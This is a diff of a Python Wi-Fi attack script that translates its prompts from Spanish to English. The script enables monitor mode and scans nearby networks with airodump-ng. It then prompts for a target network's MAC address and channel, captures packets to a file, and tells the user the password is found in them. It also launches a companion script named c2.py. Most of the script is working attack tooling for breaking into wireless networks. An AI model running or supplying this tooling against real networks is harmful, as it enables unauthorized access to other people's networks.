@@ -8,15 +8,15 @@ os.system ("sudo clear")
 
 print ("""
 =--------------------------------------------=
-|Configurando targeta de red en modo monitor |
+|Configuring monitor mode                     |
 =--------------------------------------------=\n""")
 
-print ("Dispositivos de interfaces de Redes\n")
+print ("Interface devices\n")
 os.system ('sudo iwconfig')
 
 print ("""\n
 %*************************************%
-  Escriba el nombre de su targeta wifi
+  Please type your network adapters name. (Most likely: wlan0, wlo1)
 %*************************************%""")
 wifi = input ('>> ')
 os.system ('clear')
@@ -27,13 +27,13 @@ os.system ('clear')
 
 print ("""
 =----------------------------------=
-|Escaneando Redes Wifi Disponibles |
+|Scanning nearby networks |
 =----------------------------------=\n""")
 os.system ('sudo iwconfig')
 
 print ("""\n
 %***********************************%
-  ingrese la targeta en modo monitor
+  Type your network adapters name in monitor mode. (Most likely: wlan0mon, wlo1mon)
 %***********************************%""")
 targetaM = input ('>> ')
 airodump_ng = ("sudo airodump-ng %s" %(targetaM))
@@ -41,19 +41,19 @@ os.system ('clear')
 
 print ("""
 =--------=
-|  NOTA  |
+|Attention  |
 =--------=""")
-print ("\nRecuerde presionar ( Ctrl + C ) para finalizar el escaneo\n")
-input ("***Presione ( Enter ) para continuar ***")
+print ("\nPress (Ctrl + C) when you find the network you want to target.\n")
+input ("***Press (enter) to continue ***")
 os.system (airodump_ng)
 
-print ("\nIngrese la direccion mac del wifi objetivo")
+print ("\nType target's MAC Address")
 macObjetivo = input (">> ")
-print ("Ingrese el canal del wifi objetivo")
+print ("Type target network's channel")
 canal_objetivo = input (">> ")
 
 ruta1 = ("../captura/")
-print ("\nIngrese un nombre para el archivo de captura")
+print ("\nType a name for capture file. (Any name you want)")
 archivo_captura = input (">> ")
 ruta_captura = (ruta1 + archivo_captura)
 airodump_ng2 = ("sudo airodump-ng -w %s --bssid %s -c%s %s" % (ruta_captura, macObjetivo, canal_objetivo, targetaM))
@@ -63,16 +63,15 @@ os.system ('clear')
 
 print ("""
 %********************%
- Capturando paquetes
+Capturing packets
 %********************%""")
 
-print ("""Comenzara a atrapar los paquetes dentro de ellos se encuentra
-la contrasena, se aconseja esperar a 10,000 beacons como minimo""")
+print ("""Starting to capture packets, the password is found within them, it is recommended to wait until you have 10K beacons at least""")
 
-print ("\nPresione ( Enter ) para continuar")
+print ("\nPress (enter) to continue")
 os.system ('clear')
 
-os.chdir ("../componentes")
+os.chdir ("../modules")
 os.system ("gnome-terminal -- python3 c2.py")
 
 os.system (airodump_ng2)
